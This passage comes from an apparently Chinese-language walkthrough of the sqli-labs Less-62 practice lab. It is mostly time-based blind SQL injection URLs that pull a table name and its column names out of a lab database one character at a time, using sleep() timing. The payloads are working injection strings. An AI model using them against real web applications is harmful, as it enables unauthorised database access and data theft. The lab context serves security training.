class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),4,1))=112,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">5</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">104</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),6,1))=104,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">7</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),8,1))=102,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">9</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">107</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),10,1))=118,sleep(3),1)--+</span><br><span class="hljs-string">每一位都出来了，ascii码分别为</span><br><span class="hljs-string">108 114 113 112 104 104 114 102 107 118</span><br><span class="hljs-string">查找ascii码，对应的字符为</span><br><span class="hljs-string">lrqphhrfkv</span><br><span class="hljs-string">最后不忘在验证一下，从第一位到第十位全取出来，这次就不用ascii码了，直接和字符串比较，浏览器转圈了，一张表名自然就是lrqphhrfkv</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">10</span>))<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>爆字段（列）<br>已经知道了表名称，接下来该获取字段的名称，思路：字段个数-&gt;每个字段的长度-&gt;根据每个字段的长度判断每个字段的每一位</p><p>字段个数payload如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">公式模板<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select count(column_name) from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27;)=n,sleep(3),1)--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">其中，核心部分，和n比较，通过改变n的值以及n前面的符号（&lt;,&gt;,=），不断让count(column_name)和不同的数字比较大小，如果成立都会执行第二个语句，也就是sleep(3)</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span>)<span class="hljs-operator">&lt;</span><span class="hljs-number">10</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>成立<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select count(column_name) from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27;)&lt;5,sleep(3),1)--+</span><br><span class="hljs-string">成立</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">3</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>成立，比<span class="hljs-number">5</span>小，比<span class="hljs-number">3</span>大，那应该是只有<span class="hljs-number">4</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select count(column_name) from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27;)=4,sleep(3),1)--+</span><br><span class="hljs-string">字段个数为4</span><br></code></pre></td></tr></table></figure><p>既然已经判断出了字段个数，就应该判断每个字段的长度</p><p>字段长度payload分析如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">公式模板<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit a,b)=c,sleep(3),1)--+</span><br><span class="hljs-string">其中，核心部分为limit a,b)=c，a从0开始，表示着第a+1个字段开始，即a为0，就是第一个字段开始，b一般取1，表示取几个，c就是最后比较的长度，那么，下面都代表第一个字段的长度，是否小于5</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> length(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">&lt;</span><span class="hljs-number">5</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>第一个字段<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 0,1)&lt;5,sleep(3),1)--+</span><br><span class="hljs-string">浏览器转圈，说明比5小，再和3比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> length(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">&lt;</span><span class="hljs-number">3</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器转圈，说明比<span class="hljs-number">3</span>小，再和<span class="hljs-number">2</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 0,1)&lt;2,sleep(3),1)--+</span><br><span class="hljs-string">浏览器转圈，说明比3小，比2不大</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> length(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">2</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器转圈，说明第一个字段的长度为<span class="hljs-number">2</span><br>第二个字段，通过改变a的值（b就取默认为<span class="hljs-number">1</span>不要变），来判断第<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4.</span>..个字段<br>第二个字段<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 1,1)=6,sleep(3),1)--+</span><br><span class="hljs-string">第三个字段</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> length(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">11</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>第四个字段<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 3,1)=4,sleep(3),1)--+</span><br></code></pre></td></tr></table></figure><p>把每一个字段的每一位取出来（共4个字段），判断每一位大小，也就是字段名，这里和数据库名和表名方法类似</p><p>字段名payload分析如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit a,b),c,d))&gt;n,sleep(3),1)--+</span><br><span class="hljs-string">其中，核心部分为limit a,b),c,d))&gt;n，b和d一般默认为1，a从0开始，表示着第a+1个字段开始，即a为0，就是第一个字段开始，c从1开始，表示着从字段名的第一位开始，那么，下面都代表第一个字段的第一位的ascii码，是否大于100</span><br><span class="hljs-string"></span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">100</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>第一位，先和<span class="hljs-number">100</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 0,1),1,1))&gt;100,sleep(3),1)--+</span><br><span class="hljs-string">浏览器转圈，说明比100大，再和120比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">120</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器没转圈，说明比<span class="hljs-number">120</span>小，再和<span class="hljs-number">110</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 0,1),1,1))&gt;110,sleep(3),1)--+</span><br><span class="hljs-string">浏览器没转圈，说明比110小，再和105比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">105</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器没转圈，说明不小于<span class="hljs-number">105</span>大，再和<span class="hljs-number">102</span>比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 0,1),1,1))&gt;102,sleep(3),1)--+</span><br><span class="hljs-string">浏览器转圈，说明比102大，再和104比较</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">104</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>浏览器转圈，说明比<span class="hljs-number">104</span>大，不下雨<span class="hljs-number">105</span>，再和<span class="hljs-number">105</span>做等号比较<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 0,1),1,1))=105,sleep(3),1)--+</span><br><span class="hljs-string">至此为止，第一位拿下，第一位的ascii码为105，去acsii码表查看，值105对应的十进制为字符i，说明第一张表的第一位是i</span><br><span class="hljs-string"></span><br><span class="hljs-string">以此类推，大家动手去判断一下，把公式中a和c从往后推，我这里的最终结果如下</span><br><span class="hljs-string"></span><br><span class="hljs-string">第一个字段（2位）</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">105</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 0,1),2,1))=100,sleep(3),1)--+</span><br><span class="hljs-string">ascii码分别为</span><br><span class="hljs-string">105 100</span><br><span class="hljs-string">对应的字符为</span><br><span class="hljs-string">id</span><br><span class="hljs-string">最后不忘在验证一下</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;id&#x27;</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><br>第二个字段（<span class="hljs-number">6</span>位）<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 1,1),1,1))=115,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">101</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 1,1),3,1))=115,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.239</span><span class="hljs-number">.138</span>:<span class="hljs-number">86</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>index.php<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>lrqphhrfkv<span class="hljs-string">&#x27; limit 1,1),5,1))=105,sleep(3),1)--+</span><br><span class="hljs-string">http://192.168.239.138:86/Less-62/index.php/?id=1&#x27;</span>) <span class="hljs-keyword">and</span> if(ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;lrqphhrfkv&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">6</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">100</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>ascii码分别为<br><span class="hljs-number">115</span> <span class="hljs-number">101</span> <span class="hljs-number">115</span> <span class="hljs-number">115</span> <span class="hljs-number">105</span> <span class="hljs-number">100</span><br>对应的字符为<br>sessid<br>最后不忘在验证一下<br>http:<span class="hljs-operator">/</span><span 